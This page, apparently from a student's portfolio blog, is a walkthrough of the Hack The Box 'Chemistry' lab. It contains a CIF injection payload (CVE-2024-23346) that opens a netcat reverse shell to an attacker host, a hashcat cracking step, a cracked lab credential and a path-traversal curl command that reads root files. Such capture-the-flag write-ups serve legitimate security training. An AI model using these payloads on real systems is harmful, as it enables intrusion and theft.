<!DOCTYPE html>
<html>
<head>
  <head>
    <!-- Include Meta Tags Here -->
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1 user-scalable=no, shrink-to-fit=no">
<meta content='#000000' name='theme-color'/>
<meta name="keywords" content="Site, Template, Theme">
<title>Jose's Portfolio | Chemistry</title>

<!-- Open Graph general (Facebook, Pinterest & Google+) -->
<meta name="og:title" content="Jose's Portfolio | Chemistry">
<meta name="og:description" content="The Chemistry machine on Hack The Box is vulnerable to various techniques, such as command injection, LFI, and vulnerabilities in CIF file handling. Through these vulnerabilities, a reverse shell was executed, privileges were escalated, and the flags user.txt and root.txt were obtained.">
<meta name="og:image" content="/assets/images/Rooms/HTB/Chemistry/Chemistry.png">
<meta name="og:image:alt" content="Jose's Portfolio | Chemistry">
<meta name="og:url" content="http://localhost:4000/blog/Chemistry">
<meta name="article:author" content="https://www.facebook.com/">
<meta name="og:site_name" content="Jose's Portfolio | Chemistry">
<meta name="og:type" content="website">
<!-- Twitter -->
<meta property="twitter:card" content="summary_large_image"/>
<meta name="twitter:title" content="Jose's Portfolio | Chemistry">
<meta name="twitter:description" content="The Chemistry machine on Hack The Box is vulnerable to various techniques, such as command injection, LFI, and vulnerabilities in CIF file handling. Through these vulnerabilities, a reverse shell was executed, privileges were escalated, and the flags user.txt and root.txt were obtained.">
<meta name="twitter:site" content="@">
<meta name="twitter:creator" content="@">
<meta name="twitter:image:src" content="/assets/images/Rooms/HTB/Chemistry/Chemistry.png">
<!-- Search Engine -->
<meta name="description" content="The Chemistry machine on Hack The Box is vulnerable to various techniques, such as command injection, LFI, and vulnerabilities in CIF file handling. Through these vulnerabilities, a reverse shell was executed, privileges were escalated, and the flags user.txt and root.txt were obtained.">
<meta name="image" content="/assets/images/Rooms/HTB/Chemistry/Chemistry.png">
<!-- Schema.org for Google -->
<meta itemprop="name" content="Jose's Portfolio | Chemistry">
<meta name="author" content="Jose Luis Venega"/>
<meta itemprop="description" content="The Chemistry machine on Hack The Box is vulnerable to various techniques, such as command injection, LFI, and vulnerabilities in CIF file handling. Through these vulnerabilities, a reverse shell was executed, privileges were escalated, and the flags user.txt and root.txt were obtained.">
<meta itemprop="image" content="/assets/images/Rooms/HTB/Chemistry/Chemistry.png">

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }
    gtag('js', new Date());

    gtag('config', '');
</script>
    <title>Jose's Portfolio</title>
    <link rel="stylesheet" href="/assets/css/style.css">
      <!-- Incluye el CSS de Prism.js -->
    <link rel="stylesheet" href="../prism.css">
    <script src="https://kit.fontawesome.com/6a97161b76.js" crossorigin="anonymous"></script>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    
    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon">
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var titleElement = document.getElementById('page-title');
            var icon = "/assest/images/favicon.png"; // Puedes usar cualquier emoji o icono aquí
            titleElement.textContent = icon + " " + titleElement.textContent;
        });
    </script>
</head>
</head>

<body>
  <nav class="navbar is-black is-fixed-top" role="navigation" aria-label="main navigation" id="navbar">
    <div class="container">

        <!-- logo or branding image on left side -->
       
        <!-- Logo o imagen de marca en el lado izquierdo -->
        <div class="navbar-brand">
            <a class="navbar-item"
                href="http://localhost:4000/">
                    <img src="/assets/images/favicon.png" 
                        alt="Site Icon" 
                        style="width: 24px; height: 24px; vertical-align: middle; margin-right: 8px;">
                    <i class="/assest/images/favicon.png"></i>
                    <strong>Jose's Portfolio</strong>
                </a>
            <div class="navbar-burger" data-target="navbar-menu">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>

        <!-- children of navbar-menu must be navbar-start and/or navbar-end -->
        <div class="navbar-menu has-background-black" id="navbar-menu">
            <!-- navbar items | left side -->
            <!-- <div class="navbar-start">
            </div> -->
            <!-- navbar items | right side -->
            <div class="navbar-end">
                <a class="navbar-item "
                    href="http://localhost:4000/">HOME</a>
                <a class="navbar-item" href="http://localhost:4000/#about">WHOAMI</a>
                <a class="navbar-item" href="http://localhost:4000/#contact">CONTACT</a>
                <a class="navbar-item "
                    href="http://localhost:4000/blog">MACHINES</a>
            </div>
        </div>
    </div>
</nav>
<!-- Bulma Navbar JS -->
<script>
    document.addEventListener('DOMContentLoaded', function () {
        /* Get all "navbar-burger" elements */
        var $navbarBurgers = Array.prototype.slice.call(document.querySelectorAll('.navbar-burger'), 0);
        /* Check if there are any navbar burgers */
        if ($navbarBurgers.length > 0) {
            /* Add a click event on each of them */
            $navbarBurgers.forEach(function ($el) {
                $el.addEventListener('click', function () {
                    /* Get the target from the "data-target" attribute */
                    var target = $el.dataset.target;
                    var $target = document.getElementById(target);
                    /* Toggle the class on both the "navbar-burger" and the "navbar-menu" */
                    $el.classList.toggle('is-active');
                    $target.classList.toggle('is-active');
                });
            });
        }
    });
</script>
  <section class="hero is-fullheight has-text-centered" id="post">
    <div class="hero-body">
      <div class="container">
        <a href="/blog/Chemistry" class="has-text-black" id="title">
          <h1 class="title has-text-centered is-2 has-text-weight-semibold ">Chemistry</h1>
        </a>
        <hr class="has-background-black">
        <div class="columns is-variable is-5 has-text-centered">
          <div class="column is-6">
            <div style="text-align: center;">
              <img src="/assets/images/Rooms/HTB/Chemistry/Chemistry.png" alt="Chemistry" id="post-image">
            </div>
          </div>
          <div class="subtitle column is-5 has-text-left-desktop has-text-left-fullhd has-text-left-tablet has-text-center-mobile" style="text-align: left;">
            
            <p id="description" class="content is-small has-text-weight-medium is-uppercase">
              The Chemistry machine on Hack The Box is vulnerable to various techniques, such as command injection, LFI, and vulnerabilities in CIF file handling. Through these vulnerabilities, a reverse shell was executed, privileges were escalated, and the flags user.txt and root.txt were obtained.
            </p>
            <p class="subtitle is-uppercase is-6 has-text-weight-normal has-text-black-ter">LAB LINK: 
              <b><a href="https://app.hackthebox.com/machines/631" target="page.enlace">Chemistry</a></b>
            </p>
            
            <!-- Dificultad -->
            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Difficulty: 
              <b>
                <span class="tag difficulty easy">
                  Easy
                </span>
              </b>
            </p>

            <!-- Sistema Operativo -->
            
            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Operating System: 
              <b>Linux</b>
            </p>
            

            <!-- Skills -->
            
            <p class="subtitle is-6 is-uppercase has-text-weight-normal has-text-black-ter">Skills: 
              <b>Command Injection, LFI, CIF files vulnerability, Database Analysis and Exploration, Hash cracking</b>
            </p>
            
          </div>
        </div>
        <div class="content has-text-justified-desktop has-text-justified-fullhd has-text-justified has-text-justified-tablet has-text-left-mobile">
          <p><p>First, I’m going to perform a port scanning in order to find out which ports are open:</p>
<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">sudo nmap -sS --open -p- -Pn -n -vvv --min-rate 5000 &lt;target_IP&gt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/1.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>
<p>We have the following ports open → 22, 5000 and 8089. So our next step is to perform a exhaustive scan to find out the versions and additional information about the discovered ports:</p>
<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">sudo nmap -sCV &lt;target_IP&gt;</code></pre>
  </div>
</div>

<table>
  <tr>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/2.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
      </div>
    </th>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/3.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
      </div>
    </th>
  </tr>
</table>

<p>As you can see above, port 22 is a <em>SSH</em> service, port 5000 scan result gives us information related to a web application and port 8089 we don’t know what it is at the moment.</p>

<p>As we don’t have valid credentials to perform a login via <em>SSH</em>, we are going to check the web application on port 5000:</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/5.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>At first glance we are not able to see interesting information. So let’s fuzzing the web to find out some hidden directories.</p>

<p>We can use either <code>Gobuster</code>, <code>Wfuzz</code> or other fuzzer to do this task. I used <code>Gobuster</code>, for instance.</p>
<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">gobuster dir -u &lt;http://target_IP&gt; -w &lt;path_to_wordlist&gt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/6.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>Nice! We found a hidden directory called <em>/login</em> and <em>/register</em>:</p>

<table>
  <tr>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/7.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
      </div>
    </th>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/8.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
      </div>
    </th>
  </tr>
</table>

<p>We can proceed by registering a new account, where we will find text that says ‘An example is available here’. Clicking on it will download a <code>.cif</code> file.</p>

<p>A <strong>CIF</strong> file is a <em>Crystallographic Information File</em>. You can read more about it <a href="https://en.wikipedia.org/wiki/Crystallographic_Information_File" target="_blank">here!</a></p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/9.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:400px;" />
  <p>This is the <code>.cif</code> file.</p>
</div>

<p>Now, we can search on Google for information about any vulnerability related with this kind of file.</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/10.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>I found this <a href="https://github.com/9carlo6/CVE-2024-23346" target="_blank">GitHub repository</a>, where you can find a <code>.cif</code> file that contains the exploit.</p>

<p>The methodology is to embed a <em>reverse shell</em> (by specifying the VPN IP and listener port) inside the file to gain access to the victim machine.</p>

<div style="text-align:center;">
  <div class="code-container" style="max-width: 100%; overflow-x: auto;">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code class="language-bash">_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__( *[().__class__.__mro__[1]]+ ["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("busybox nc &lt;Attacker_IP&gt; &lt;Listener_Port&gt; -e /bin/bash");0,0,0'</code></pre>
  </div>
</div>

<p>We modify the script and upload the file to the system. At the same time, we listen on the port we specified in the script with <code>Netcat</code>, and if we press the button that says ‘View’, the reverse shell will be triggered:</p>

<table>
  <tr>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/11.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
      </div>
    </th>
    <th>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/12.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
      </div>
    </th>
  </tr>
</table>

<p>After that, we are inside the server, so the next step is to find out where the <em>user flag<em> is.</em></em></p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/13.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>The <em>user flag<em> is located in the user <strong>rosa</strong> directory, but if we perform a <code>cat</code> to visualize the content, an error will be displayed saying that we don’t have the required permissions.</em></em></p>

<p>We can confirm this by using <code>ls -la</code>, and since we are the app user, we belong to the other group for that file, so we cannot open it.</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/14.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>As a conclusion, we need to pivot to user <strong>rosa</strong> to visualize the content of the <em>user flag</em>. To achieve this, we need to find information on a privilege escalation vector that allows us to pivot to that user.</p>

<p>By navigating through directories we find a database, which may can contain credentials of the system users. So, if we convert this file into a <em>base64</em> string, we can copy it to our machine in order to see what it contains.</p>
<table>
  <tr>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/15.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
        <p>We convert the file into a base64 string</p>
      </div>
    </td>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/16.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
        <p>We decrypt the base64 string into its normal state</p>
      </div>
    </td>
  </tr>
</table>

<p>After that, we have the database on our machine without any problems. We can check the file’s integrity by using <code>md5sum</code> on both machines. If the hash is the same, the file hasn’t changed during the transfer.</p>

<p>Now, we can use the <code>sqlite3</code> tool to view the tables of the database.</p>

<p>By using an <em>SQL</em> query, we can list the users from a table:</p>

<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      SQL
      <button class="copy-button" data-code="SQL">Copy</button>
    </div>
    <pre><code class="language-bash">SELECT * FROM &lt;table_name&gt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/17.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>
<p>Awesome, we have information about users and their passwords, which are hashed. So, we need to decrypt them for a potential connection via <em>SSH</em>.</p>

<p>To decrypt the passwords, we can user either <code>JohnTheRipper</code> or <code>Hashcat</code>.</p>

<p>Before all of that, we store the hash of the user <strong>rosa</strong> in a ‘.txt’ file and then proceed to decrypt the password.</p>

<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">hashcat -m 0 -a 0 rosa.txt /usr/share/wordlist/rockyou.txt;</code></pre>
  </div>
</div>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/18.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
  <p>We got the rosa's password, and its credentials are → <strong>rosa:unicorniosrosados</strong>.</p>
</div>

<p>Now, with these credentials, we can perform a connection via <em>SSH</em> as <strong>rosa</strong> user:</p>

<table>
  <th>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/19.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:450px;" />
        <p>We stablish the <em>SSH</em> connection</p>
      </div>
    </td>
    <td>
      <div style="text-align: center;">
        <img src="/assets/images/Rooms/HTB/Chemistry/20.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
        <p>The <em>user flag</em> is located on the user' home directory</p>
      </div>
    </td>
  </th>
</table>

<p>After getting the <em>user flag</em>, we need to obtain the <em>root flag</em>. To achieve this, we need to find a privilege escalation vector.</p>

<p>We can perform a <code>sudo -l</code> to check if the user <strong>rosa</strong> can execute commands as sudo, but no luck.</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/21.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>Also, we can check the binaries with the SUID bit set, by using the following command → <code>find / -perm -4000 2&gt;/dev/null | xargs ls -l</code>:</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/22.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
</div>

<p>We also did not find an unusual binary with the SUID bit set, so we can use <code>linpeas.sh</code> in order to find vulnerabilities on the machine.</p>

<p>We can find this script in rosa’s user <em>/home</em> directory:</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/23.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:800px;" />
</div>

<p>Let’s execute the <code>linpeas.sh</code> script:</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/24.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>If we use this script, we can find that there are several ports open that are not visible from outside. That is, we can see these ports if we are on the victim machine but not on our own.</p>

<p>Another way to find this information is by using this command → <code>netstat -tulnp | grep -i listen</code>.</p>

<p>Knowing this, we see that something is running on port 8080. We can use the <code>curl</code> command to check whether it is a web application or not.</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/25.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>After reading the headers of the request, we confirm that we are dealing with a web application.</p>

<p>Thanks to that, we have the server version and the status of the request headers. Therefore, we can look for vulnerabilities in this website by using this exploit → <a href="https://github.com/z3rObyte/CVE-2024-23334-PoC" target="_blank">CVE-2024-23334-PoC</a>.</p>

<p>A good practice is to see what the exploit does to understand how it works. So, let’s check the exploit using <code>cat</code> command:</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/26.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:600px;" />
</div>

<p>As you can see, the command executes a <em>path traversal</em> to read an arbitrary file. That is, the website is vulnerable to a <strong>Local File Inclusion</strong> or <strong>LFI</strong> vulnerability.</p>

<p>So, instead of executing the whole script, we can perform a request using the <code>curl</code> command as follows:</p>

<div style="text-align:center;">
 <div class="code-container">
    <div class="code-header">
      Bash
      <button class="copy-button" data-code="bash">Copy</button>
    </div>
    <pre><code class="language-bash">curl --path-as-is http://localhost:8080/assets/../../../../root/root.txt</code></pre>
  </div>
</div>

<p>Why the <em>/root</em> directory? Because the <em>root flag</em> is located there, so if we can read this file, we can obtain the flag we desire.</p>

<div style="text-align: center;">
  <img src="/assets/images/Rooms/HTB/Chemistry/28.png" alt="Untitled" onclick="openModal(this.src)" style="width:100%; max-width:900px;" />
</div>

<p>Done, we got the <em>root flag</em>.</p>

<hr />

<div style="text-align: center;">
  <a href="https://www.hackthebox.com/achievement/machine/1157775/631" target="_blank">
    <img src="/assets/images/Rooms/HTB/Chemistry/29.png" alt="Hack The Box Achievement" style="width:100%; max-width:300px;" />
  </a>
</div>
</p>
        </div>
        
        <div class="disqus-comments" id="disqus_thread"></div>
        
      </div>
    </div>
  </section>
  <footer id="footer">
    <!--Footer Button-->
    <div class="container has-text-centered has-background-grey-darker" id="backtotop">
        <a class="has-text-white" onclick="window.scroll(0,0)">BACK TO TOP</a>
    </div>
    <!--Footer Main Section-->
    <!-- <div class="has-background-grey-darker">
        <div class="container columns">
            Name Section-->
            <!-- <div class="column has-text-left-desktop has-text-centered-mobile">
                <a href="http://localhost:4000/#about">
                    <div class="columns">
                        <div class="column is-one-fifth-desktop is-one-fifth-fullhd is-one-quarter-tablet">
                            <figure class="image is-64x64">
                                <img class="is-rounded" src="/assets/images/me.png">
                            </figure>
                        </div>
                        <div class="column is-marginless">
                            <h5 class="has-text-grey-lighter">Jose Luis Venega</h5>
                            <div class="content has-text-grey">
                                <p>Hi! I'm Jose Luis Venega, a Computer Engineering student at the Universi...</p>
                            </div>
                        </div>
                    </div>
                </a>
            </div> -->

            <!--Link Section
            <div class="column has-text-white">
                <h3>More Links</h3>
                
                <li>
                    <a target="_blank" href="http://localhost:4000/feed.xml">Subscribe via RSS</a>
                </li>
            </div> -->

            <!--Blog-post Section-->
            <!-- <div class="column has-text-white">
                <h3>Recent Posts</h3>
                
                <li>
                    <a href="http://localhost:4000/blog/LinkVortex">LinkVortex</a>
                </li>
                
                <li>
                    <a href="http://localhost:4000/blog/Cicada">Cicada</a>
                </li>
                
                <li>
                    <a href="http://localhost:4000/blog/Chemistry">Chemistry</a>
                </li>
                
            </div>
        </div> -->
    </div>
    <div class="has-background-black has-text-centered has-text-white" id="credits">
        <i class="far fa-copyright"></i> 2025 | A Theme made by <a href="https://github.com/Joseeelv" target="_blank" rel="noopener noreferrer">Joseeelv</a> Powered by <a href="https://jekyllrb.com/" target="_blank">Jekyll</a>
    </div>
</footer>

  <!-- Modal -->
  <div id="myModal" class="modal">
    <span class="close" onclick="closeModal()">&times;</span>
    <img class="modal-content" id="img01">
  </div>

  <!-- Prism.js Script -->
  <script src="../prism.js"></script>
  <script>
    function copyToClipboard(event) {
      const button = event.target;
      const codeContainer = button.closest('.code-container');
      const codeElement = codeContainer.querySelector('code');
    
      if (!codeElement) {
        console.error('No se encontró el elemento <code> para copiar.');
        return;
      }

      const code = codeElement.textContent;

      navigator.clipboard.writeText(code).then(() => {
        button.textContent = 'Copied!';

        setTimeout(() => {
          button.textContent = 'Copy';
        }, 2000); // 2000 ms = 2 segundos

      }).catch(err => {
        console.error('Error al copiar al portapapeles: ', err);
      });
    }

    document.querySelectorAll('.copy-button').forEach(button => {
      button.addEventListener('click', copyToClipboard);
    });

    function openModal(imgSrc) {
      var modal = document.getElementById("myModal");
      var modalImg = document.getElementById("img01");

      modal.style.display = "block";
      setTimeout(function() {
        modal.classList.add('show');
      }, 10); // Delay to trigger the animation
      modalImg.src = imgSrc;
    }

    function closeModal(event) {
      if (event) event.stopPropagation();
      var modal = document.getElementById("myModal");
      modal.classList.remove('show');
      setTimeout(function() {
        modal.style.display = "none";
      }, 300); // Match this duration with the CSS animation duration
    }

    window.onclick = function(event) {
      var modal = document.getElementById("myModal");
      if (event.target == modal) {
        closeModal();
      }
    }
  </script>
</body>
</html>
